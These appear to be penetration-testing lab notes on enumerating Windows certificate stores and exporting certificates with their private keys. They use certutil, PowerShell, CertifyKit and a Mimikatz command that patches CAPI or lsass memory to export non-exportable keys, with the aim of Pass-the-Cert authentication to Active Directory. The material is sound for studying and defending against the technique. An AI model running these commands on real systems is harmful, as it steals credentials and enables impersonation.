## Exporting certificates and their private keys using Window’s Crypto APIs##
#### What's running under the hood ####
- On a computer that has the Windows operating system installed, the operating system stores a certificate locally on the computer in a storage location called the _certificate store_. A certificate store often has numerous certificates, possibly issued from a number of different certification authorities (CAs).
- There are three types of certificate stores in Windows.
	1. User Account store
	2. Service Account store
	3. Local Computer store
- Each of the three stores contain a number of containers which certificates go into
	- Personal (can be known as **My** when using scripts to add certs)
	- Trusted Root Certification Authority (can be known as **Root**)
	- Enterprise Trust
	- Intermediate Certification Authority
	- Active Directory User Object
	- Trusted Publishers
	- Untrusted Certificates
	- Third Party Root Certification Authorities
	- Trusted People

#### What the attack is about ####
- It is possible to export user/machine certificates from the Windows Certificate Manager if our current user has appropriate privileges.
- These methods use the **Microsoft CryptoAPI** (CAPI) or more modern Cryptography API: Next Generation (CNG) to interact with the certificate store. These APIs perform various cryptographic services that needed for certificate storage and authentication (among other uses).
- Certificates can be exported in a `.pem`/`.cer` or `.pfx` format.
- Certificates can then be reused to Pass-the-Cert and authenticate to Active Directory through PKINIT.
- If the certificate is password protected, it could be vulnerable to brute force/password guessing attacks.
- It is possible to list and export certificates from the Windows Certstore using:
	- built-in tools like CertUtil
	- built-in PowerShell Cmdlets
	- external tools like CertStealer, CertifyKit

### Enumeration ###
- If we have Local Admin access to the machine, it is possible to enumerate other Users' CertStores.

1. **certutil**
- List folders for each certificate store.
```
PS C:\ADCS\Auditor> certutil -enumstore

  (CurrentUser: -user)
LocalMachine
  (CurrentService: -service)
  (Services: -service -service)
  (Users: -user -user)
  (CurrentUserGroupPolicy: -user -grouppolicy)
  (LocalMachineGroupPolicy: -grouppolicy)
  (LocalMachineEnterprise: -enterprise)

  My                 "Personal"
  Root               "Trusted Root Certification Authorities"
  Trust              "Enterprise Trust"
  CA                 "Intermediate Certification Authorities"
  TrustedPublisher   "Trusted Publishers"
  Disallowed         "Untrusted Certificates"
  AuthRoot           "Third-Party Root Certification Authorities"
  TrustedPeople      "Trusted People"
  ClientAuthIssuer   "Client Authentication Issuers"
  FlightRoot         "Preview Build Roots"
  TestSignRoot       "Test Roots"
  AddressBook        "Other People"
  Local NonRemovable Certificates
  Remote Desktop     "Remote Desktop"
  REQUEST            "Certificate Enrollment Requests"
  SmartCardRoot      "Smart Card Trusted Roots"
  TrustedAppRoot     "Trusted Packaged App Installation Authorities"
  TrustedDevices     "Trusted Devices"
  Windows Live ID Token Issuer
  WindowsServerUpdateServices
CertUtil: -enumstore command completed successfully.
```

- Enumerate the _LocalMachine_ – **My** Personal CertStore
```
PS C:\ADCS\Auditor> certutil -store My
```

- Enumerate the _CurrentUser_ – **My** Personal CertStore
```
PS C:\ADCS\Auditor> certutil -store -user My
```

- _You can enumerate any other store you want for saved certificates by altering the `My` argument._
- Do not forget to search in both the _LocalMachine_ and _CurrentUser_ stores!

2. **PowerShell**
- List the accessible certificate stores.
```
PS C:\ADCS\Auditor> Get-ChildItem Cert:\


Location   : CurrentUser
StoreNames : {TrustedPublisher, ClientAuthIssuer, Root, UserDS...}

Location   : LocalMachine
StoreNames : {TestSignRoot, ClientAuthIssuer, Remote Desktop, Root...}
```

- Recursively search for certificates inside all the containers in _LocalMachine_ CertStore.
`Get-ChildItem Cert:\LocalMachine\ -Recurse`

- Recursively search for certificates inside all the containers in _CurrentUser_ CertStore.
`Get-ChildItem Cert:\CurrentUser\ -Recurse`

3. **CertifyKit**
- Enumerate the _CurrentUser_ – **My** Personal CertStore
`.\CertifyKit.exe list`

- Enumerate the _LocalMachine_ – **My** Personal CertStore
`.\CertifyKit.exe list /storename:my /storelocation:localmachine`

- _You can enumerate any other store you want for saved certificates by altering the `my` argument._
#### Exfiltration ####
1. **certmgr**
Run → `certmgr.msc` → Action → All Tasks → Export ...

2. **certutil**
- We need to use the appropriate Certificate **Serial Number**.
`PS C:\Windows\Tasks> certutil -p "certpass" -exportpfx 3000000009ab1d2a9f13756439000000000009 C:\Windows\Tasks\studentadmin.pfx`

2. **CertifyKit**
- We need to use the appropriate Certificate **Thumbprint**.
`PS C:\Windows\Tasks> .\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:93B4027A4CD6A67A175E796E5DF8B673ACD2D75D /outfile:C:\Windows\Tasks\studentadmin_certifykit.pfx`

3. **Mimikatz**
- In some conditions, the CAPI or CNG APIs are configured to block the private key export and not allow extraction of non-exportable certificates
- This can be patched with Mimikatz to allow exportation of private keys.
- If keys are marked as not exportable then you will have to patch CAPI to allow export of non-exportable keys in the current process. This can be done with the `crypto::capi` command.
- If you are trying to export device certificates that are not exportable, Mimikatz can instead patch the memory of the running lsass.exe process to bypass protections using the `crypto::cng` command.
`PS C:\Windows\Tasks> .\mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /store:my /export" "exit"`

4. **PowerShell**
- If tools like CertUtil are blocked for execution, we can alternatively use PowerShell cmdlets to import/export certificates from the CertStore.
- We need to use the appropriate Certificate **Thumbprint**.
```
$mypwd = ConvertTo-SecureString -String "Passw0rd!" -Force -AsPlainText
PS C:\Windows\Tasks> Export-PfxCertificate -Cert Cert:\LocalMachine\My\93B4027A4CD6A67A175E796E5DF8B673ACD2D75D -FilePath C:\Windows\Tasks\studentadmin_psh.pfx -Password $mypwd
```